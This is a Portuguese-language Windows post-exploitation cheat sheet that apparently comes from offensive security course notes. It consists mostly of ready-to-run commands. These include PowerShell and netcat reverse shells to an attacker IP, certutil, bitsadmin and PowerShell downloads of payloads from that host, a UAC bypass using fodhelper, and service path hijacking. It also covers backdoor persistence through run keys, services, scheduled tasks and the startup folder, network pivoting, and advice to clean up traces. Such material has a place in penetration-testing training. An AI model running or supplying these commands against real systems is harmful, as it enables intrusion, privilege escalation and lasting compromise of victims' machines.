
## 1. Estabelecimento de Shell Estável

### 1.1 Melhorar Shell Básica
```cmd
# Verificar se PowerShell está disponível
powershell
powershell.exe

# Verificar se Python está disponível
python
python.exe
```

### 1.2 PowerShell Remoto
```powershell
# Estabelecer conexão remota
$client = New-Object System.Net.Sockets.TCPClient("ATACANTE_IP",4444)
$stream = $client.GetStream()
$reader = New-Object System.IO.StreamReader($stream)
$writer = New-Object System.IO.StreamWriter($stream)
$writer.AutoFlush = $true
while(($line = $reader.ReadLine()) -ne $null) { Invoke-Expression $line }
```

### 1.3 Shell Reversa com Netcat
```cmd
# No alvo Windows
nc.exe -e cmd ATACANTE_IP 4444

# Shell reversa com PowerShell
powershell -c "& { $client = New-Object System.Net.Sockets.TCPClient('ATACANTE_IP',4444); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() }"
```

## 2. Enumeração Inicial do Sistema

### 2.1 Informações Básicas
```cmd
# Usuário atual
whoami
echo %USERNAME%

# Informações do usuário
whoami /all
whoami /groups

# Informações do sistema
systeminfo
hostname
ver

# Exemplos específicos do curso
# Ver o usuário e seus grupos, verificando o nível de integridade
whoami /groups

# Ver informações do sistema
systeminfo

# Adicionar um usuário
net user fulano senha123 /add
```

### 2.2 Informações de Rede
```cmd
# Interfaces de rede
ipconfig /all
netsh interface show interface

# Roteamento
route print
netsh interface ip show route

# Conexões de rede
netstat -an
netstat -ano
```

### 2.3 Processos e Serviços
```cmd
# Processos em execução
tasklist
tasklist /v
tasklist /SVC
wmic process list full

# Serviços em execução
sc query
sc query state= all
wmic service list full

# Exemplo específico do curso
# Ver serviços em execução no windows
wmic service get Name,State,PathName | findstr "Running"
```

## 3. Enumeração de Usuários e Grupos

### 3.1 Usuários do Sistema
```cmd
# Listar usuários
net user
wmic useraccount list full

# Usuários logados
query user
qwinsta
```

### 3.2 Grupos
```cmd
# Listar grupos
net localgroup
net group

# Grupos do usuário atual
whoami /groups
```

### 3.3 Informações de Domínio
```cmd
# Informações do domínio
net config workstation
net config server
nltest /domain_trusts
```

## 4. Enumeração de Arquivos e Permissões

### 4.1 Arquivos com Permissões Especiais
```cmd
# Verificar permissões de arquivos
icacls C:\Windows\System32\*
icacls C:\Program Files\*

# Verificar permissões de diretórios
icacls C:\Users\*
icacls C:\Temp\*
```

### 4.2 Diretórios com Permissão de Escrita
```cmd
# Verificar diretórios graváveis
icacls C:\Windows\Temp
icacls C:\Temp
icacls C:\Users\%USERNAME%\AppData\Local\Temp
```

### 4.3 Arquivos de Configuração
```cmd
# Arquivos de configuração
dir C:\Windows\System32\config\
dir C:\Windows\System32\drivers\etc\
dir C:\ProgramData\
```

## 5. Enumeração de Registro

### 5.1 Chaves de Registro Importantes
```cmd
# Chaves de inicialização
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

# Chaves de serviços
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

### 5.2 Chaves de Segurança
```cmd
# Políticas de segurança
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies
```

## 6. Enumeração de Serviços

### 6.1 Serviços em Execução
```cmd
# Listar serviços
sc query
sc query state= running

# Informações detalhadas
wmic service list full
```

### 6.2 Serviços com Privilégios Elevados
```cmd
# Serviços rodando como SYSTEM
sc query | findstr "SERVICE_NAME"
wmic service where "startmode='auto'" get name,startname,pathname
```

## 7. Enumeração de Drivers

### 7.1 Drivers Carregados
```cmd
# Listar drivers
driverquery
wmic sysdriver list full
```

### 7.2 Drivers Vulneráveis
```cmd
# Verificar drivers conhecidos por vulnerabilidades
driverquery | findstr -i "vulnerable"
```

## 8. Enumeração de Aplicações

### 8.1 Aplicações Instaladas
```cmd
# Listar aplicações
wmic product get name,version
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
```

### 8.2 Aplicações em Execução
```cmd
# Processos em execução
tasklist /v
wmic process list full
```

## 9. Enumeração de Logs

### 9.1 Logs do Sistema
```cmd
# Logs do Event Viewer
wevtutil qe System /c:10
wevtutil qe Security /c:10
wevtutil qe Application /c:10
```

### 9.2 Logs de Segurança
```cmd
# Logs de login
wevtutil qe Security /c:10 /f:text | findstr "4624"
wevtutil qe Security /c:10 /f:text | findstr "4625"
```

## 10. Transferência de Arquivos

### 10.1 PowerShell Download
```powershell
# Download com PowerShell
Invoke-WebRequest -Uri "http://ATACANTE_IP:8080/arquivo.exe" -OutFile "arquivo.exe"

# Download com System.Net.WebClient
$client = New-Object System.Net.WebClient
$client.DownloadFile("http://ATACANTE_IP:8080/arquivo.exe", "arquivo.exe")
```

### 10.2 Certutil Download
```cmd
# Download com certutil
certutil -urlcache -f http://ATACANTE_IP:8080/arquivo.exe arquivo.exe
```

### 10.3 Bitsadmin Download
```cmd
# Download com bitsadmin
bitsadmin /transfer download /priority high http://ATACANTE_IP:8080/arquivo.exe C:\temp\arquivo.exe
```

### 10.4 Transferência com Netcat
```cmd
# No atacante (enviar)
nc -lvp 4444 < arquivo.exe

# No alvo (receber)
nc ATACANTE_IP 4444 > arquivo.exe
```

## 11. Escalação de Privilégios

### 11.1 Verificar Privilégios Atuais
```cmd
# Verificar se é administrador
net localgroup administrators
whoami /groups | findstr "S-1-5-32-544"
```

### 11.2 Verificar UAC
```cmd
# Verificar configuração do UAC
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

# Exemplo específico do curso
# Bypass UAC Windows
# 1) encontrar um processo que esteja executando com um nível de privilégio alto
# 2) olhando o manifest do executável alvo: sigcheck.exe -a -m path_arquivo.exe, encontrar um com 

# Baixar no alvo o sysinternalssuite que é uma ferramenta da microsoft, com ela poderemos ver o manifesto UAC de cada executável, com o comando
sigcheck.exe -a -m C:\Windows\System32\fodhelper.exe

# outro exe vulneravel: computerdefaults

# e localizar onde fala de requestedExecutionLevel se esta como highestAvailable
# ou se vc esta como administrator mas tem baixa permissão, vc pode procurar por requireAdministrator que também funciona se o valor de autoElevate estiver true para qualquer um dos casos.
```

### 11.3 Exploração de Serviços
```cmd
# Verificar serviços com permissões fracas
wmic service where "startmode='auto'" get name,startname,pathname
icacls "C:\Program Files\Service\service.exe"

# Exemplo específico do curso
# Escalação de privilégios
# Basicamente precisamos de um processo ou executável que esteja executando com root ou system e que este processo ou executável execute nosso programa, como o cmd.exe ou o bash, pois o sistema operacional da os mesmos privilégios que o processo que o chamou.

# Tentar encontrar algum serviço que rode como admin, mas que permita controle pelo usuário ou grupo que temos acesso, assim basta mudar o path do serviço para o comando que queremos executar como admin e reiniciar o serviço, como colocar uma shell reversa no path.
```

### 11.4 Exploração de Drivers
```cmd
# Verificar drivers com permissões fracas
wmic sysdriver list full
icacls "C:\Windows\System32\drivers\driver.sys"
```

## 12. Persistência

### 12.1 Registry Run Keys
```cmd
# Adicionar à inicialização
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Backdoor" /t REG_SZ /d "C:\temp\backdoor.exe"

# Verificar chaves de inicialização
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
```

### 12.2 Serviços
```cmd
# Criar serviço
sc create "BackdoorService" binpath= "C:\temp\backdoor.exe" start= auto
sc start "BackdoorService"

# Verificar serviços
sc query "BackdoorService"
```

### 12.3 Scheduled Tasks
```cmd
# Criar tarefa agendada
schtasks /create /tn "BackdoorTask" /tr "C:\temp\backdoor.exe" /sc minute /mo 1

# Verificar tarefas
schtasks /query /tn "BackdoorTask"
```

### 12.4 Startup Folder
```cmd
# Adicionar ao startup
copy "C:\temp\backdoor.exe" "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
```

## 14. Enumeração de Rede Interna

### 14.1 Descoberta de Hosts
```cmd
# Ping sweep
for /l %i in (1,1,254) do @ping -n 1 -w 100 192.168.1.%i | find "Reply"

# ARP table
arp -a
```

### 14.2 Varredura de Portas
```cmd
# Port scan básico
for /l %i in (1,1,254) do @echo 192.168.1.%i && @ping -n 1 -w 100 192.168.1.%i | find "Reply"
```

### 14.3 Pivoting
```cmd
# Configurar rota
route add 192.168.2.0 mask 255.255.255.0 192.168.1.1

# Verificar rotas
route print
```

## 15. Checklist de Validação

- [ ] Shell estável estabelecida
- [ ] Informações básicas coletadas
- [ ] Usuários e grupos enumerados
- [ ] Arquivos com permissões especiais identificados
- [ ] Registro enumerado
- [ ] Serviços verificados
- [ ] Drivers enumerados
- [ ] Aplicações identificadas
- [ ] Logs analisados
- [ ] Transferência de arquivos testada
- [ ] Escalação de privilégios tentada
- [ ] Persistência estabelecida
- [ ] Rede interna enumerada
- [ ] Pivoting configurado
- [ ] Resultados documentados

## 16. Ferramentas Automatizadas

Se precisar de ofuscação usar: https://github.com/t3l3machus/Villain

### 16.1 WinPEAS
```cmd
# Tentar usar o powershell (executar pelo cmd) para ter visão colorida do winpeas
# Baixar WinPEAS
certutil -urlcache -f http://ATACANTE_IP:8080/winPEASx64.exe winPEASx64.exe

# Executar WinPEAS
winPEASx64.exe

# Testar com a versão BAT
```

### 16.2 PowerUp
```powershell
# Baixar PowerUp
Invoke-WebRequest -Uri "http://ATACANTE_IP:8080/PowerUp.ps1" -OutFile "PowerUp.ps1"

# Executar PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

### 16.3 PrivescCheck
```powershell
# Baixar PrivescCheck
Invoke-WebRequest -Uri "http://ATACANTE_IP:8080/PrivescCheck.ps1" -OutFile "PrivescCheck.ps1"

# Executar PrivescCheck
Import-Module .\PrivescCheck.ps1
Invoke-PrivescCheck
```

## 17. Comandos Úteis

### 17.1 Informações do Sistema
```cmd
# Informações detalhadas
systeminfo
wmic os get *
wmic cpu get *
wmic memorychip get *
```

### 17.2 Informações de Rede
```cmd
# Informações de rede detalhadas
ipconfig /all
netsh interface show interface
netsh interface ip show config
```

### 17.3 Informações de Segurança
```cmd
# Políticas de segurança
secedit /export /cfg security_policy.cfg
gpresult /r
```

## 18. Dicas Importantes

1. **Sempre melhorar a shell** primeiro
2. **Usar PowerShell** quando possível
3. **Verificar permissões** cuidadosamente
4. **Usar ferramentas automatizadas** como complemento
5. **Documentar descobertas** para escalação
6. **Testar exploits** antes de usar
7. **Limpar rastros** após exploração
8. **Estabelecer persistência** quando necessário
9. **Verificar UAC** antes de tentar escalação
10. **Usar múltiplas técnicas** de persistência
